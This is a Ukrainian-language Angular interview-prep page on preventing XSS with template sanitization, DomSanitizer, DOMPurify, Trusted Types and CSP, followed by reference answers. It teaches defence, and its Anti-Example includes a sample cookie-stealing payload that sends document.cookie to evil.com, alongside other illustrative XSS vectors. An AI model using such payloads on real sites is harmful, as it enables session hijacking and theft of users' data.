---
title: "XSS Prevention & DOM Sanitization"
block: 16
topic: 1
slug: "xss-sanitization"
difficulty: 3
sinceVersion: "2"
tags: ["XSS", "DomSanitizer", "SafeValue", "innerHTML", "bypassSecurityTrust", "Trusted Types", "sanitization"]
relatedTopics: ["csp-csrf", "secure-coding", "auth-patterns"]
interviewQuestions:
  - id: "b16t1q1"
    level: "junior"
    question: "Як Angular захищає від XSS атак за замовчуванням?"
    referenceAnswers:
      junior: "Angular автоматично екранує HTML у template bindings. Якщо bind значення що містить HTML теги — вони відображаються як текст, а не виконуються."
      mid: "Angular sanitizes всі значення у template bindings автоматично: `{{ userInput }}` — escape HTML entities. `[property]` bindings — sanitize залежно від контексту. Angular розпізнає security-sensitive properties: `innerHTML`, `href`, `src`, `style`. Для них Angular застосовує DomSanitizer. Виключення: `[innerHTML]` — Angular sanitizes HTML (видаляє script tags та event handlers) але залишає безпечний HTML."
      senior: "Angular XSS prevention mechanisms: 1) Template expression sanitization: всі `{{ }}` interpolations автоматично escaped — `<script>` стає `&lt;script&gt;`. 2) Property bindings: Angular класифікує URL contexts (href, src) і sanitizes. `javascript:` URL → stripped. 3) `[innerHTML]`: Angular sanitizes HTML через DomSanitizer.sanitizeHtml — видаляє script, on* attributes, data: URLs у href. 4) Security contexts: HTML, Style, URL, ResourceURL, Script. Кожен контекст має свою sanitization логіку. 5) Angular compiler warns про unsafe bindings. 6) Server-side: Angular не sanitizes на SSR — дані що приходять з API можуть містити XSS payload у SSR context. Потрібен server-side sanitization."
      staff: "Angular XSS model деталі: 1) SecurityContext enum: `NONE`, `HTML`, `STYLE`, `URL`, `RESOURCE_URL`, `SCRIPT`. Compiler асоціює кожен binding з security context. 2) DomSanitizer.sanitize(ctx, value): runtime check — якщо value є SafeValue (bypass) — повертає без зміни; якщо string — sanitize для context. 3) Trusted Types integration (Angular 15+): замість string маніпуляцій — Trusted Types API. Angular marks its own bindings as trusted, third-party код не може inject. 4) CSP + Trusted Types: `Content-Security-Policy: require-trusted-types-for 'script'` — browser не виконає script що не є TrustedScript. 5) XSS via API: Angular не sanitizes дані що отримані з API і відображаються через `[innerHTML]` — кожен `bypassSecurityTrustHtml` call є потенційною вразливістю. 6) Compiler output: Angular compiler генерує sanitization calls у compiled template code."
    commonMistakes:
      - "Думають що `[innerHTML]` повністю безпечний — Angular видаляє script але не всі XSS vectors"
      - "Не розуміють що server-side rendering потребує окремої sanitization"
      - "Плутають HTML escaping ({{ }}) і HTML sanitization ([innerHTML])"
    relatedQuestions: ["b16t1q2", "b16t1q3"]
  - id: "b16t1q2"
    level: "mid"
    question: "Що таке DomSanitizer і які методи `bypassSecurityTrust*` існують?"
    referenceAnswers:
      junior: "DomSanitizer — сервіс Angular для sanitization небезпечного HTML/URL контенту. `bypassSecurityTrustHtml` дозволяє Angular відображати HTML без sanitization."
      mid: "DomSanitizer надає: `sanitize(ctx, value)`, `bypassSecurityTrustHtml(html)`, `bypassSecurityTrustStyle(css)`, `bypassSecurityTrustUrl(url)`, `bypassSecurityTrustResourceUrl(url)`, `bypassSecurityTrustScript(js)`. Кожен повертає SafeValue wrapper. Angular не sanitizes SafeValue — вважає його trusted. Легітимне використання: HTML з CMS де контент sanitized на сервері і trusted. Небезпечне: передача user input напряму до bypassSecurityTrustHtml."
      senior: "bypassSecurityTrust* деталі: 1) Повертають typed wrappers: `SafeHtml`, `SafeStyle`, `SafeUrl`, `SafeResourceUrl`, `SafeScript`. 2) Angular renderer перевіряє: `if (value instanceof SafeValue) return value.getTypedValue()`. 3) Легітимні use cases: bypassSecurityTrustUrl — для custom URL schemes (`myapp://...`). bypassSecurityTrustStyle — для dynamic CSS у style binding. bypassSecurityTrustHtml — для rich text з CMS (після server-side sanitization). 4) Небезпечно: `bypassSecurityTrustHtml(userInput)` — user може inject `<img onerror='xss()'>`. 5) bypassSecurityTrustResourceUrl: `<iframe [src]>` або `<script [src]>` — критично, дозволяє load external resources. 6) Never: bypassSecurityTrustScript — практично немає легітимного use case. 7) Audit: grep codebase на `bypassSecurityTrust` — кожен виклик потребує security review."
      staff: "bypassSecurityTrust* governance: 1) Code review rule: будь-який `bypassSecurityTrust*` requires security team approval. 2) Alternative до bypassSecurityTrustHtml: DOMParser + custom allowlist sanitizer (як DOMPurify). Ніколи не довіряти API response без власної sanitization. 3) DOMPurify інтеграція: `DOMPurify.sanitize(htmlFromApi)` → then `bypassSecurityTrustHtml()`. 4) Trusted Types policy: `window.trustedTypes.createPolicy('sanitize-html', { createHTML: input => DOMPurify.sanitize(input) })`. 5) Static analysis: eslint-plugin-security або custom rule що знаходить unsafe `bypassSecurityTrust*` patterns. 6) Supply chain: third-party lib що викликає bypassSecurityTrustHtml — потенційна вразливість. Audit dependencies. 7) SSR XSS: у SSR Angular context, `document` manipulation може inject script у server response. Angular Universal: додаткова обережність з dynamic HTML generation."
    commonMistakes:
      - "`bypassSecurityTrustHtml(userInput)` без sanitization — XSS"
      - "Використовують bypassSecurityTrustUrl для HTTP URLs — не потрібно, лише для custom schemes"
      - "Не аудитують codebase на наявність bypassSecurityTrust*"
    relatedQuestions: ["b16t1q1", "b16t1q3"]
  - id: "b16t1q3"
    level: "mid"
    question: "Як виникає XSS через server-side API дані у Angular і як його запобігти?"
    referenceAnswers:
      junior: "Якщо API повертає HTML і ми його відображаємо через `[innerHTML]` — там може бути шкідливий код."
      mid: "Сценарій: API повертає `{ content: '<h1>Title</h1><script>stealCookies()</script>' }`. Component: `this.content = response.content; template: <div [innerHTML]='content'>`. Angular sanitizes: видаляє script. Але: `<img src='x' onerror='xss()'>` — Angular може не видалити. Рішення: 1) Server-side sanitization (найкраще). 2) DOMPurify на client. 3) Не використовувати innerHTML для user-generated content."
      senior: "API XSS vectors Angular не blokes: 1) `<a href='javascript:xss()'>` — Angular sanitizes href але деякі legacy browsers. 2) `<form action='http://evil.com'>` — form hijacking. 3) CSS expression injection у style: `background: expression(xss())` — IE legacy. 4) Mutation XSS (mXSS): HTML що виглядає безпечно до parsing але браузер re-parses інакше. DOMPurify захищає від mXSS. 5) Angular sanitizer: `DomSanitizer.sanitize(SecurityContext.HTML, html)` видаляє script, on* attributes, javascript: URLs. 6) Практика: будь-який HTML від зовнішніх джерел → `DOMPurify.sanitize()` перед відображенням. 7) Content Security Policy як defense-in-depth: навіть якщо XSS inject відбувся — CSP блокує виконання."
      staff: "XSS defense-in-depth strategy: 1) Layer 1: Angular auto-sanitization (template bindings). 2) Layer 2: DOMPurify для будь-якого user-generated або CMS HTML. 3) Layer 3: CSP (`script-src 'nonce-xxx'`) — навіть injected script не виконається без nonce. 4) Layer 4: Trusted Types — browser рівень enforcement. 5) Layer 5: HttpOnly cookies — навіть при XSS, cookie не вкрадеш через JS. 6) Layer 6: SameSite cookies — CSRF prevention. 7) Security testing: автоматизований XSS testing у CI (OWASP ZAP, Burp Suite scanner). 8) Threat modeling: для кожного `[innerHTML]` — звідки контент? Хто контролює? Чи sanitized на сервері? 9) Security headers: `X-XSS-Protection: 0` (modern — deprecated, може бути шкідливим у деяких browsers). Замість нього: CSP."
    commonMistakes:
      - "Покладаються лише на Angular sanitization без DOMPurify для complex HTML"
      - "Не тестують XSS scenarios з user-generated content"
      - "Думають HttpOnly cookie вирішує всі XSS проблеми"
    relatedQuestions: ["b16t1q2", "b16t1q4"]
  - id: "b16t1q4"
    level: "senior"
    question: "Що таке Trusted Types і як Angular їх підтримує?"
    referenceAnswers:
      junior: "Trusted Types — це браузерний API що запобігає небезпечним DOM маніпуляціям. Angular підтримує їх для підвищення безпеки."
      mid: "Trusted Types (W3C specification, Chrome 83+): browser enforces що до небезпечних sink (innerHTML, document.write, eval) можна передати лише Trusted* objects, не plain strings. CSP: `require-trusted-types-for 'script'`. Angular 15+: Angular внутрішньо використовує Trusted Types для своїх DOM операцій — `innerHTML` assignments wrapped у TrustedHTML policy. `@angular/core` policy: 'angular'. Потрібен `Content-Security-Policy: trusted-types angular; require-trusted-types-for 'script'`."
      senior: "Trusted Types у Angular деталі: 1) Angular внутрішньо: при `require-trusted-types-for 'script'` в CSP, Angular використовує `trustedTypes.createPolicy('angular', { createHTML: ... })`. 2) `bypassSecurityTrustHtml` → `TrustedHTML` object. 3) Third-party libs: якщо third-party lib використовує `element.innerHTML = string` без TT — порушення у TT enforcement mode. 4) Report-only mode: `require-trusted-types-for 'script'; report-uri /csp-report` — collect violations без blocking. 5) Angular Material і Trusted Types: повна підтримка з Angular 15+. 6) Custom policies: якщо потрібен custom HTML — `trustedTypes.createPolicy('myapp-sanitize', { createHTML: input => DOMPurify.sanitize(input) })`. 7) AngularJS (legacy): не підтримує TT — міграційний ризик у hybrid apps."
      staff: "Trusted Types deployment strategy: 1) Gradual rollout: report-only перший, audit violations, fix, switch to enforcement. 2) Violation categories: Angular internal (safe), third-party libs (must audit), custom code (must fix). 3) Policy taxonomy: `angular` (Angular internal), `angular#unsafe-bypass` (bypassSecurityTrust), `myapp-html` (custom sanitized content). 4) CSP header для Angular SPA: `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{nonce}'; trusted-types angular angular#unsafe-bypass; require-trusted-types-for 'script'`. 5) Infrastructure: nonce generation на web server (Nginx/Node), injected у Angular index.html. 6) Testing: TT violation tests у E2E suite. 7) Angular 17+ Zoneless compatibility: Trusted Types повністю сумісні. 8) Monitoring: CSP violation reports → security dashboard."
    commonMistakes:
      - "Активують Trusted Types без audit third-party libs — додаток ламається"
      - "Не використовують report-only спочатку"
      - "Плутають Angular 'angular' policy і 'angular#unsafe-bypass' policy"
    relatedQuestions: ["b16t1q3", "b16t1q5"]
  - id: "b16t1q5"
    level: "staff"
    question: "Як побудувати многорівневий захист від XSS у production Angular додатку?"
    referenceAnswers:
      junior: "Angular захищає автоматично, плюс треба додати Content Security Policy у HTTP заголовки."
      mid: "Defense in depth: Angular auto-sanitization + DOMPurify для user HTML + CSP headers + HttpOnly cookies для session. Регулярний security audit codebase на bypassSecurityTrust*."
      senior: "XSS defense layers: 1) Angular templates — auto escape/sanitize. 2) DOMPurify для будь-якого HTML з external sources. 3) CSP: `script-src 'nonce-{nonce}'` — nonce-based, сувора. 4) Trusted Types: TT enforcement + angular policy. 5) HttpOnly + Secure + SameSite=Strict cookies. 6) HTTPS everywhere. 7) Security headers: X-Content-Type-Options, X-Frame-Options. 8) Automated XSS testing у CI. 9) Regular bypassSecurityTrust* audit у code review."
      staff: "Enterprise XSS protection program: 1) Security champion у кожній команді — перший ревʼювер security-sensitive code. 2) Developer training: XSS awareness, Angular security model, DOMPurify usage. 3) Static analysis: ESLint custom rule для unsafe patterns (`bypassSecurityTrustHtml` без preceding sanitization). 4) DAST (Dynamic Application Security Testing): OWASP ZAP у CI проти staging environment. 5) Penetration testing: quarterly by third-party security firm. 6) Bug bounty: якщо public product — encourage responsible disclosure. 7) Incident response: якщо XSS виявлено → what sensitive data exposed? cookies? tokens? → revoke all sessions, force re-login. 8) Trusted Types + CSP reporting → SIEM integration → alerts on violations. 9) Third-party audit: `npm audit` + Snyk для supply chain XSS (package що inject script). 10) Angular version updates: security patches часто у Angular patch releases."
    commonMistakes:
      - "Тільки один рівень захисту (лише Angular auto-sanitization)"
      - "CSP без nonce — `'unsafe-inline'` нівелює CSP"
      - "Не відстежують XSS violations через CSP reporting"
    relatedQuestions: ["b16t1q4", "b16t2q1"]
---

## Core Concept

**English definition:** XSS (Cross-Site Scripting) prevention in Angular combines automatic context-aware sanitization in templates, the DomSanitizer service for explicit trust marking, Trusted Types browser enforcement, and CSP headers to create defense-in-depth against script injection attacks.

**Пояснення:** XSS — атака де зловмисник впроваджує шкідливий JavaScript у сторінку що переглядають інші користувачі. Angular надає автоматичний захист для шаблонів: всі `{{ }}` interpolations escape HTML entities, property bindings sanitize відповідно до security context (HTML, URL, Style). Але автоматичний захист не всесильний — `[innerHTML]` binding, dynamic content з API і `bypassSecurityTrust*` методи є потенційними векторами.

**Яку проблему вирішує:** Без автоматичної sanitization: developer забуває escaped user input → `<script>` у content → виконання довільного JS у браузері жертви → крадіжка cookies, session hijacking, keylogging, redirection. Angular вирішує це за замовчуванням, але не знімає відповідальність — особливо для rich HTML content.

**Як працює під капотом:** Angular compiler асоціює кожен template binding з `SecurityContext` enum. При компіляції template: `{{ value }}` → `sanitize(SecurityContext.HTML, value)` або `textContent` assignment (не innerHTML — безпечно). `[innerHTML]="value"` → `sanitize(SecurityContext.HTML, value)` → Angular's built-in HTML sanitizer парсить HTML, white-lists allowed tags/attributes, strips script/on* attributes. `[href]="value"` → `sanitize(SecurityContext.URL, value)` → блокує `javascript:` URLs. DomSanitizer.sanitize() є wrapper над internal sanitization logic. SafeValue objects: Trusted Types у Angular 15+ — Angular's DOM operations use TrustedHTML/TrustedScript wrappers.

**Trade-offs та обмеження:** Angular sanitizer знищує деякий легітимний HTML (custom attributes, деякі CSS). DOMPurify more configurable allowlist. `bypassSecurityTrustHtml` звільняє від sanitization повністю — developer приймає відповідальність. Trusted Types ламають third-party libs що роблять unsafe DOM operations. CSP з nonce потребує server-side render або server-injected nonce.

**Версійність:** Angular автоматичний sanitization — з v2 (2016). DomSanitizer API — з v2. Trusted Types підтримка — Angular 15 (2022). Angular CLI nonce injection для CSP — Angular 16+. `Content-Security-Policy` ng CLI config у angular.json — Angular 16+.

## Deep Details

### Edge Cases

**`innerHTML` vs `textContent`:** `[innerHTML]` binding sanitizes HTML (видаляє script, on* attrs) але дозволяє HTML structure. `{{ value }}` використовує `textContent` — ніякого HTML parsing, просто текст. Завжди використовувати `{{ value }}` якщо не потрібен HTML rendering.

**SVG XSS:** Angular's sanitizer може пропускати деякі SVG-based XSS vectors (SVG `<use xlink:href>`, SVG `onload`). DOMPurify надійніший для SVG content.

**Mutation XSS (mXSS):** Деякі HTML patterns виглядають безпечно до DOM parsing але браузер повторно парсить і отримує executable script. DOMPurify захищає від mXSS, Angular's вбудований sanitizer — частково.

**Angular SSR і XSS:** У SSR context, `document` manipulation на сервері може inject content у HTML response. Angular Universal: уникати `document.write()`, забезпечити що server-rendered HTML не містить user input без sanitization.

### Junior vs Senior Understanding

**Junior** знає що Angular auto-escapes `{{ }}` і що є `bypassSecurityTrustHtml`.

**Senior** розуміє: 1) SecurityContext enum і як compiler асоціює bindings з contexts. 2) Різниця між HTML escaping (`{{ }}`) і HTML sanitization (`[innerHTML]`). 3) Конкретні XSS vectors що Angular не блокує автоматично (mXSS, SVG XSS). 4) Trusted Types як browser-level enforcement. 5) DOMPurify allowlist configuration. 6) CSP nonce strategy. 7) Аудит codebase на `bypassSecurityTrust*` як частина security review.

### Deprecation & Migration Path

**`X-XSS-Protection` header:** Deprecated і потенційно шкідливий у нових браузерах (може enable XSS у deactivated mode у IE). Замінений на CSP. **`document.write()`:** Deprecated у Web APIs, XSS vector, Angular SSR не використовує. **Angular innerHTML sanitizer allowlist:** Постійно оновлюється. При оновленні Angular — перевіряти changelog на зміни у sanitization behavior.

### Connections to Other Concepts

- **CSP & CSRF (Block 16, Topic 3):** CSP як defense-in-depth проти XSS.
- **Auth Patterns (Block 16, Topic 2):** HttpOnly cookies захищають session token навіть при XSS.
- **Secure Coding (Block 16, Topic 4):** OWASP Angular checklist включає XSS prevention.

## Examples

### Basic Usage

```typescript
// Safe: {{ }} interpolation — auto text escaping
// template: <p>{{ userComment }}</p>
// userComment = '<script>alert("xss")</script>'
// Rendered: <p>&lt;script&gt;alert("xss")&lt;/script&gt;</p>  ← текст, не script

// Safe: Angular sanitizes [innerHTML]
// template: <div [innerHTML]="htmlContent"></div>
// htmlContent = '<b>Hello</b><script>alert("xss")</script>'
// Rendered: <div><b>Hello</b></div>  ← script видалено Angular sanitizer

// НЕБЕЗПЕЧНО: bypass без sanitization
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
import { Component, inject } from '@angular/core';

@Component({
  selector: 'app-content',
  standalone: true,
  template: `<div [innerHTML]="safeHtml"></div>`,
})
export class ContentComponent {
  private sanitizer = inject(DomSanitizer);

  // ❌ НЕБЕЗПЕЧНО якщо htmlFromApi містить user input
  safeHtml: SafeHtml = this.sanitizer.bypassSecurityTrustHtml(
    this.htmlFromApi // XSS якщо не sanitized на сервері
  );

  get htmlFromApi(): string {
    return '<b>Article</b>'; // У реальності: з API
  }
}
```

### Production Scenario

```typescript
// ✅ ПРАВИЛЬНО: DOMPurify + bypassSecurityTrustHtml
import DOMPurify from 'dompurify';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
import { Component, Input, OnChanges, SimpleChanges, inject } from '@angular/core';

@Component({
  selector: 'app-rich-content',
  standalone: true,
  template: `<div [innerHTML]="safeContent"></div>`,
})
export class RichContentComponent implements OnChanges {
  @Input() htmlContent = '';

  private sanitizer = inject(DomSanitizer);
  safeContent: SafeHtml = '';

  ngOnChanges(changes: SimpleChanges): void {
    if (changes['htmlContent']) {
      this.safeContent = this.createSafeHtml(this.htmlContent);
    }
  }

  private createSafeHtml(html: string): SafeHtml {
    // Крок 1: DOMPurify sanitization з explicit allowlist
    const clean = DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'h1', 'h2', 'h3'],
      ALLOWED_ATTR: ['href', 'target', 'rel'],
      // Обов'язково: sanitize URLs у href
      FORCE_BODY: true,
    });

    // Крок 2: Повідомити Angular що HTML вже sanitized
    return this.sanitizer.bypassSecurityTrustHtml(clean);
  }
}

// ✅ Безпечний custom URL scheme
// Для URL як 'myapp://deep-link/route'
@Component({
  selector: 'app-link',
  standalone: true,
  template: `<a [href]="safeUrl">{{ label }}</a>`,
})
export class SafeLinkComponent {
  @Input() url = '';
  @Input() label = '';

  private sanitizer = inject(DomSanitizer);

  get safeUrl() {
    // Angular блокує non-http(s) URLs за замовчуванням
    // bypassSecurityTrustUrl ЛИШЕ для trusted custom schemes
    if (this.url.startsWith('myapp://')) {
      return this.sanitizer.bypassSecurityTrustUrl(this.url);
    }
    return this.url; // http/https — Angular handle
  }
}

// angular.json — CSP nonce configuration (Angular 16+)
// "security": {
//   "autoCsp": true   — Angular CLI генерує nonce у index.html
// }
```

### Anti-Example

```typescript
// ❌ КРИТИЧНО НЕБЕЗПЕЧНО: user input → bypassSecurityTrustHtml
@Component({
  template: `<div [innerHTML]="userBio"></div>`,
})
export class ProfileComponent {
  private sanitizer = inject(DomSanitizer);

  // user.bio приходить з API і може бути user-controlled
  get userBio(): SafeHtml {
    return this.sanitizer.bypassSecurityTrustHtml(this.user.bio);
    // ❌ Якщо user.bio = '<img onerror="document.location='https://evil.com?c='+document.cookie">'
    // → cookie theft XSS
  }
}

// ❌ НЕБЕЗПЕЧНО: innerHTML з template literal без sanitization
@Component({
  template: ``,
})
export class DangerousComponent implements OnInit {
  @ViewChild('container') container!: ElementRef;

  ngOnInit() {
    // Обхід Angular sanitization через native DOM
    this.container.nativeElement.innerHTML = this.getHtmlFromApi();
    // ❌ Angular не знає про це! Ніякої sanitization.
  }
}
```

## Code Smells and Anti-Patterns

| Anti-Pattern | Why It's Bad | Better Approach |
|---|---|---|
| `bypassSecurityTrustHtml(userControlledInput)` | Пряма XSS вразливість — будь-який script у input виконується | `DOMPurify.sanitize(input)` → потім `bypassSecurityTrustHtml` |
| `nativeElement.innerHTML = apiResponse` | Обходить Angular sanitization повністю | `[innerHTML]` binding або DOMPurify + bypassSecurityTrustHtml |
| `[innerHTML]` для user-generated content без DOMPurify | Angular sanitizer не захищає від mXSS і деяких SVG vectors | DOMPurify з explicit allowlist перед відображенням |
| CSP з `'unsafe-inline'` для scripts | Нівелює весь захист CSP — inline script дозволений | Nonce-based CSP: `'nonce-{random}'` або `'strict-dynamic'` |
| Відсутність audit `bypassSecurityTrust*` у codebase | Кожен виклик — потенційна XSS вразливість без visibility | ESLint custom rule + mandatory security review для кожного виклику |

## Interview Block

### [L1 — Warm-up] Як Angular захищає від XSS за замовчуванням?

**Signal being tested:** Розуміння automatic sanitization механізму і різниці між escaping та sanitization.

**What the interviewer expects:** {{ }} = escaping (text), [innerHTML] = sanitization (HTML). SecurityContext. Не просто "Angular автоматично захищає".

**How to probe deeper:** "Чим відрізняється `{{ value }}` від `[innerHTML]='value'` з точки зору безпеки?"

**Reference answer:** `{{ value }}` — Angular використовує `textContent` assignment — повний текстовий escape, ніякого HTML parsing. `[innerHTML]` — Angular sanitizes HTML: white-lists safe tags, видаляє script і on* attributes. SecurityContext enum: compiler асоціює кожен binding з context → `URL`, `HTML`, `STYLE`, `RESOURCE_URL`. При runtime: `sanitize(context, value)` викликається автоматично.

**Common mistakes:** Думають `[innerHTML]` повністю безпечний (Angular лише sanitizes, не блокує все). Не знають різниці між text escaping і HTML sanitization.

---

### [L2 — Mid] Коли і як правильно використовувати `bypassSecurityTrustHtml`?

**Signal being tested:** Розуміння SafeValue моделі і security implications `bypass*` методів.

**What the interviewer expects:** Легітимні use cases (server-sanitized CMS). DOMPurify перед bypass. Аудит codebase.

**How to probe deeper:** "API повертає HTML з user comments. Як безпечно відобразити його через [innerHTML]?"

**Reference answer:** `bypassSecurityTrustHtml` повідомляє Angular "я довіряю цьому HTML". Легітимно лише якщо HTML sanitized перед цим. Правильний pattern: `DOMPurify.sanitize(htmlFromApi, { ALLOWED_TAGS: [...] })` → `bypassSecurityTrustHtml(cleanHtml)`. Ніколи: `bypassSecurityTrustHtml(userInput)` без sanitization. Кожен `bypass*` виклик у codebase — потенційна вразливість, потребує review.

**Common mistakes:** `bypassSecurityTrustHtml(userInput)` напряму. Використовують bypass для звичайних http:// URLs — не потрібно.

---

### [L3 — Senior] Що таке Trusted Types і як Angular їх підтримує?

**Signal being tested:** Знання browser-level XSS prevention механізму і Angular's Trusted Types integration.

**What the interviewer expects:** W3C spec, Chrome support, CSP header, Angular `angular` policy, report-only mode для migration.

**How to probe deeper:** "Що станеться з third-party libs якщо увімкнути Trusted Types enforcement?"

**Reference answer:** Trusted Types: browser enforces що до `innerHTML`, `eval()`, `document.write()` можна передати лише TrustedHTML/TrustedScript об'єкти, не plain strings. CSP: `require-trusted-types-for 'script'`. Angular 15+: внутрішньо використовує `trustedTypes.createPolicy('angular', ...)`. Third-party libs що роблять `element.innerHTML = string` → порушення → violation report або browser block. Стратегія: report-only → audit violations → fix → enforcement.

**Common mistakes:** Вмикають enforcement без аудиту libs — app ламається. Плутають Angular policy і unsafe-bypass policy.

---

### [L4 — Staff/Principal] Як побудувати multi-layer XSS захист у production Angular додатку?

**Signal being tested:** Системне security thinking про defense-in-depth, organizational processes і incident response.

**What the interviewer expects:** Кілька рівнів захисту. Security processes (champion, training, DAST). Incident response plan.

**How to probe deeper:** "XSS знайдено у production. Які кроки ти приймаєш наступні 24 години?"

**Reference answer:** Defense layers: Angular auto-sanitization → DOMPurify → CSP nonce-based → Trusted Types → HttpOnly cookies. Process: ESLint rule для bypass* audit → security champion review → DAST у CI (OWASP ZAP) → quarterly pentest. Incident response: виявлено XSS → revoke all sessions → force re-login → audit logs для stolen data → patch deploy → postmortem.

**Common mistakes:** Один рівень захисту. CSP з `'unsafe-inline'` — нівелює CSP. Відсутність incident response plan.

## Summary

### Key Points

- `{{ }}` interpolations — text escaping через `textContent`, не HTML parsing — найбезпечніший спосіб відображення даних
- `[innerHTML]` — Angular sanitizes HTML (видаляє script, on* attrs) але не захищає від mXSS і SVG vectors
- `bypassSecurityTrust*` — маркує контент як trusted; безпечно лише після DOMPurify sanitization
- SecurityContext enum: compiler асоціює кожен binding з контекстом (HTML, URL, Style, ResourceUrl)
- Trusted Types (Angular 15+): browser-level enforcement, CSP `require-trusted-types-for 'script'`
- Defense-in-depth: Angular templates + DOMPurify + nonce-based CSP + Trusted Types + HttpOnly cookies
- Кожен `bypassSecurityTrust*` у codebase потребує security review — audit через ESLint custom rule

### Elevator Pitch (2 minutes)

Angular надає автоматичний XSS захист: `{{ }}` — text escaping, `[innerHTML]` — HTML sanitization через white-list (видаляє script, on* attrs). DomSanitizer сервіс: `bypassSecurityTrustHtml/Url/Style` — маркують контент як trusted, обходячи sanitization. Використовувати лише після DOMPurify sanitization, ніколи для user-controlled input напряму. Angular 15+ підтримує Trusted Types — browser-level enforcement: до `innerHTML` можна передати лише TrustedHTML об'єкти. CSP nonce-based policy (`'nonce-xxx'` замість `'unsafe-inline'`) — навіть injected script без nonce не виконується. Defense-in-depth у production: Angular + DOMPurify + nonce CSP + Trusted Types + HttpOnly cookies + регулярний DAST тестування.
